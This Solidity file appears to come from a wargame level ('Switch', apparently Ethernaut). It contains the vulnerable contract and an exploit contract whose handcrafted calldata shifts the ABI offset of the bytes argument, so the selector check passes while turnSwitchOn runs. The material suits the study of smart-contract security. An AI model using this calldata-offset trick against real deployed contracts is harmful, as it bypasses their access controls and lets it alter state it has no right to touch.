// SPDX-License-Identifier: MIT
pragma solidity ^0.8.13;

contract Switch {
    bool public switchOn; // switch is off
    bytes4 public offSelector = bytes4(keccak256("turnSwitchOff()"));

    modifier onlyThis() {
        require(msg.sender == address(this), "Only the contract can call this");
        _;
    }

    modifier onlyOff() {
        // we use a complex data type to put in memory
        bytes32[1] memory selector;
        // check that the calldata at position 68 (location of _data)
        assembly {
            calldatacopy(selector, 68, 4) // grab function selector from calldata
        }
        require(selector[0] == offSelector, "Can only call the turnOffSwitch function");
        _;
    }

    function flipSwitch(bytes memory _data) public onlyOff {
        (bool success,) = address(this).call(_data);
        require(success, "call failed :(");
    }

    function turnSwitchOn() public onlyThis {
        switchOn = true;
    }

    function turnSwitchOff() public onlyThis {
        switchOn = false;
    }
}

contract exploit {
    Switch target = Switch(0x7752A764d57b00D5F058d4941dcB895e073831FA);
    constructor() {
        address(target).call(hex"30c13ade0000000000000000000000000000000000000000000000000000000000000060000000000000000000000000000000000000000000000000000000000000000020606e1500000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000476227e1200000000000000000000000000000000000000000000000000000000");
        require(target.switchOn() == true);
    }
}

// 0x30c13ade
// 0000000000000000000000000000000000000000000000000000000000000060
// 0000000000000000000000000000000000000000000000000000000000000000
// 20606e1500000000000000000000000000000000000000000000000000000000
// 0000000000000000000000000000000000000000000000000000000000000004
// 76227e1200000000000000000000000000000000000000000000000000000000